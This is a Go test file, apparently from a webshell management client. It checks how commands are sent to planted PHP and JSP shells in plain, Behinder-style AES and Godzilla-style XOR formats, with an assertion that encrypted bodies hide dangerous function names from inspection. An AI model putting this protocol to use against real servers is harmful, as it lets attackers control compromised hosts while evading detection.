package protocol

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
)

func TestNormalizeProtocol(t *testing.T) {
	cases := []struct {
		in    string
		want  Protocol
		isErr bool
	}{
		{"", Plain, false}, {"plain", Plain, false}, {"PLAIN", Plain, false},
		{"behinder", Behinder, false}, {"godzilla", Godzilla, false},
		{"xor", "", true}, {"aes", "", true},
	}
	for _, c := range cases {
		got, err := NormalizeProtocol(c.in)
		if c.isErr && err == nil {
			t.Errorf("NormalizeProtocol(%q) 期望报错，实际 got=%s", c.in, got)
		}
		if !c.isErr && (err != nil || got != c.want) {
			t.Errorf("NormalizeProtocol(%q) = %s, want %s (err=%v)", c.in, got, c.want, err)
		}
	}
}

func TestNormalizeParamChannel(t *testing.T) {
	cases := []struct {
		in    string
		want  ParamChannel
		isErr bool
	}{
		{"", ParamBody, false}, {"query", ParamQuery, false}, {"COOKIE", ParamCookie, false},
		{"header", ParamHeader, false}, {"form", "", true},
	}
	for _, c := range cases {
		got, err := NormalizeParamChannel(c.in)
		if c.isErr && err == nil {
			t.Errorf("NormalizeParamChannel(%q) 期望报错", c.in)
		}
		if !c.isErr && (err != nil || got != c.want) {
			t.Errorf("NormalizeParamChannel(%q) = %s, want %s", c.in, got, c.want)
		}
	}
}

func TestSupportsProtocol(t *testing.T) {
	if !SupportsProtocol(Plain, "jsp") {
		t.Error("plain 应全语言支持")
	}
	if SupportsProtocol(Behinder, "jsp") || SupportsProtocol(Godzilla, "aspx") {
		t.Error("加密协议应仅支持 php")
	}
	if !SupportsProtocol(Behinder, "PHP") {
		t.Error("php 大小写不敏感")
	}
}

// TestPlainBuildParity plain 协议编译结果与历史行为逐字节对齐（form 编码 + GET query）。
func TestPlainBuildParity(t *testing.T) {
	req, err := Build(Plain, "php", "POST", "http://t/shell.php", "p@ss", "cmd", "echo hi", "", "pass")
	if err != nil {
		t.Fatal(err)
	}
	want := url.Values{}.Encode()
	_ = want
	if req.Method != http.MethodPost {
		t.Fatalf("method = %s", req.Method)
	}
	if got := string(req.Body); !strings.Contains(got, "pass=p%40ss") || !strings.Contains(got, "cmd=echo+hi") {
		t.Errorf("plain POST body = %s", got)
	}
	greq, err := Build(Plain, "php", "GET", "http://t/shell.php", "p", "cmd", "id", "", "pass")
	if err != nil {
		t.Fatal(err)
	}
	// url.Values.Encode() 按 key 字母序编码：cmd 在前、pass 在后
	if greq.Method != http.MethodGet || !strings.Contains(greq.URL, "cmd=id&pass=p") {
		t.Errorf("plain GET = %s %s", greq.Method, greq.URL)
	}
}

// TestPlainLargeCommandPOSTFormFallback 大命令（URL >7KB）自动降级 POST form：
// Tomcat 8KB header 限制会 400 掉超长 GET；getParameter 系壳对 form 等价。
func TestPlainLargeCommandPOSTFormFallback(t *testing.T) {
	big := strings.Repeat("A", 9000)
	req, err := Build(Plain, "jsp", "GET", "http://t/zzsg.jsp", "k-tok", "c", "echo "+big, "", "k")
	if err != nil {
		t.Fatal(err)
	}
	if req.Method != http.MethodPost {
		t.Fatalf("大命令应降级 POST, got %s", req.Method)
	}
	if strings.Contains(req.URL, "A") || len(req.URL) > 7000 {
		t.Errorf("URL 不应携带大命令: %d", len(req.URL))
	}
	if !strings.Contains(string(req.Body), "k=k-tok") || !strings.Contains(string(req.Body), "c=echo+A") {
		t.Errorf("form body 应携带参数: %.120s", req.Body)
	}
	// 小命令保持 GET
	small, err := Build(Plain, "jsp", "GET", "http://t/zzsg.jsp", "k", "c", "id", "", "k")
	if err != nil || small.Method != http.MethodGet || !strings.Contains(small.URL, "c=id") {
		t.Errorf("小命令应保持 GET: %v %s", err, small.URL)
	}
}

// TestPlainCustomPassParam 外部已有马的自定义 token 参数名（如 ?k=token&c=id 形态）：
// 密码参数名按连接配置投放，空值缺省回 "pass"。
func TestPlainCustomPassParam(t *testing.T) {
	req, err := Build(Plain, "jsp", "GET", "http://t/zsacheh.jsp", "k7Qm2xVp9Ld4", "c", "id", "", "k")
	if err != nil {
		t.Fatal(err)
	}
	if req.Method != http.MethodGet || !strings.Contains(req.URL, "c=id") || !strings.Contains(req.URL, "k=k7Qm2xVp9Ld4") {
		t.Errorf("custom passParam GET = %s %s", req.Method, req.URL)
	}
	// 缺省补齐：空 passParam → "pass"
	def, err := Build(Plain, "php", "POST", "http://t/s.php", "p", "cmd", "id", "", "  ")
	if err != nil || !strings.Contains(string(def.Body), "pass=p") {
		t.Errorf("default passParam: %v %s", err, def.Body)
	}
}

func TestPlainParamChannels(t *testing.T) {
	cq, err := Build(Plain, "php", "POST", "http://t/s.php", "p", "cmd", "id", "query", "pass")
	if err != nil || cq.Method != http.MethodGet || !strings.Contains(cq.URL, "cmd=id") {
		t.Errorf("query 通道: %v %s", err, cq)
	}
	cc, err := Build(Plain, "php", "POST", "http://t/s.php", "p", "cmd", "id", "cookie", "pass")
	if err != nil || cc.Header.Get("Cookie") == "" || len(cc.Body) != 0 {
		t.Errorf("cookie 通道: %v cookie=%q", err, cc.Header.Get("Cookie"))
	}
	ch, err := Build(Plain, "php", "POST", "http://t/s.php", "p", "mycmd", "id", "header", "pass")
	if err != nil || ch.Header.Get("X-Mycmd") != "id" || ch.Header.Get("X-Pass") != "p" {
		t.Errorf("header 通道: %v %v", err, ch.Header)
	}
}

// TestBehinderRoundTrip 客户端加密 → 桩端按冰蝎3 PHP 模板逻辑解密（key=iv=md5(pass)[:16]，
// PKCS7 去填充，按 | 切分）→ 回显执行体内容 → 客户端原样取出。验证密钥派生与报文封装。
func TestBehinderRoundTrip(t *testing.T) {
	const password = "testpass123"
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		key := deriveKeyForTest(password)
		body, err := readAll(r)
		if err != nil {
			t.Errorf("read body: %v", err)
			return
		}
		block, _ := aes.NewCipher(key)
		dec := cipher.NewCBCDecrypter(block, key)
		out := make([]byte, len(body))
		dec.CryptBlocks(out, body)
		// PKCS7 去填充
		pad := int(out[len(out)-1])
		if pad >= 1 && pad <= 16 {
			out = out[:len(out)-pad]
		}
		// 模板语义：eval|<code> → 取 code 段（此处以回显代替 eval）
		if _, err := w.Write(out); err != nil {
			t.Errorf("write: %v", err)
		}
	}))
	defer srv.Close()

	req, err := Build(Behinder, "php", "POST", srv.URL, password, "cmd", "echo :RT:MARK:END", "", "")
	if err != nil {
		t.Fatal(err)
	}
	if req.Method != http.MethodPost || len(req.Body) == 0 {
		t.Fatalf("behinder 请求规格异常: %+v", req)
	}
	if got := string(req.Body); strings.Contains(got, "system") {
		t.Error("加密体不应出现明文危险函数名")
	}
	httpReq, err := req.HTTPRequest()
	if err != nil {
		t.Fatal(err)
	}
	resp, err := http.DefaultClient.Do(httpReq)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	out := Unwrap(Behinder, password, mustRead(t, resp))
	// 执行体中命令是 base64 内嵌：eval| 前缀 + b64("echo :RT:MARK:END")
	if !strings.HasPrefix(string(out), "eval|") || !strings.Contains(string(out), "ZWNobyA6UlQ6TUFSSzpFTkQ=") {
		t.Errorf("桩端解密未见 eval| 执行体: %.80s", out)
	}
}

// TestGodzillaRoundTrip 客户端 base64(xor(code,key)) → 桩端解码解异或取标记 →
// 按模板回包算法 base64(xor(md5(key)[16:]+base64(输出)+md5(key)[:16], key)) →
// 客户端 Unwrap 还原输出。验证哥斯拉式双向编码链。
func TestGodzillaRoundTrip(t *testing.T) {
	const password = "gzpass"
	const marker = "GZ:MARK:OK"
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		key := deriveKeyForTest(password)
		raw, _ := readAll(r)
		enc, err := base64.StdEncoding.DecodeString(string(raw))
		if err != nil {
			t.Errorf("b64: %v", err)
			return
		}
		code := string(xorBytes(enc, key))
		if !strings.Contains(code, "ZWNobyBHWjpNQVJLOk9L") { // b64("echo GZ:MARK:OK")
			t.Errorf("解异或后未见执行体标记: %.80s", code)
		}
		// 模拟模板 eval 后的输出回包：base64(xor( md5(key)[16:] + base64(输出) + md5(key)[:16], key ))
		md5hex := fmt.Sprintf("%x", md5.Sum(key))
		resp1 := md5hex[16:32] + base64.StdEncoding.EncodeToString([]byte("PWNED:OUT")) + md5hex[0:16]
		_, _ = w.Write([]byte(base64.StdEncoding.EncodeToString(xorBytes([]byte(resp1), key))))
	}))
	defer srv.Close()

	req, err := Build(Godzilla, "php", "POST", srv.URL, password, "cmd", "echo "+marker, "", "")
	if err != nil {
		t.Fatal(err)
	}
	if got := string(req.Body); strings.Contains(got, "system") {
		t.Error("哥斯拉请求体不应出现明文危险函数名")
	}
	httpReq, err := req.HTTPRequest()
	if err != nil {
		t.Fatal(err)
	}
	resp, err := http.DefaultClient.Do(httpReq)
	if err != nil {
		t.Fatal(err)
	}
	defer resp.Body.Close()
	out := Unwrap(Godzilla, password, mustRead(t, resp))
	if string(out) != "PWNED:OUT" {
		t.Errorf("还原输出 = %q, want %q", out, "PWNED:OUT")
	}
}

func TestUnwrapFallback(t *testing.T) {
	// 非 godzilla 体（不可 b64 解码或过短）应原样回退
	if got := string(Unwrap(Godzilla, "p", []byte("plain text out"))); got != "plain text out" {
		t.Errorf("回退失败: %q", got)
	}
	if got := string(Unwrap(Plain, "p", []byte("x"))); got != "x" {
		t.Errorf("plain 应原样: %q", got)
	}
}

func TestApplyResponseFilter(t *testing.T) {
	if got := ApplyResponseFilter("a123b", ""); got != "a123b" {
		t.Errorf("空 filter 应原样: %q", got)
	}
	if got := ApplyResponseFilter("noise <OUT>hello</OUT> tail", `<OUT>(.*?)</OUT>`); got != "hello" {
		t.Errorf("捕获组: %q", got)
	}
	if got := ApplyResponseFilter("id=1000(nobody)", `\d+`); got != "1000" {
		t.Errorf("整段匹配: %q", got)
	}
	if got := ApplyResponseFilter("nothing", `zzz`); got != "" {
		t.Errorf("无命中应为空: %q", got)
	}
	if got := ApplyResponseFilter("bad[regex", `bad[regex`); got != "bad[regex" {
		t.Errorf("非法正则应原样返回: %q", got)
	}
}

func deriveKeyForTest(password string) []byte {
	return []byte(fmt.Sprintf("%x", md5.Sum([]byte(password))))[:16]
}

func readAll(r *http.Request) ([]byte, error) {
	defer r.Body.Close()
	return io.ReadAll(r.Body)
}

func mustRead(t *testing.T, r *http.Response) []byte {
	t.Helper()
	b, err := io.ReadAll(r.Body)
	if err != nil {
		t.Fatalf("read resp body: %v", err)
	}
	return b
}
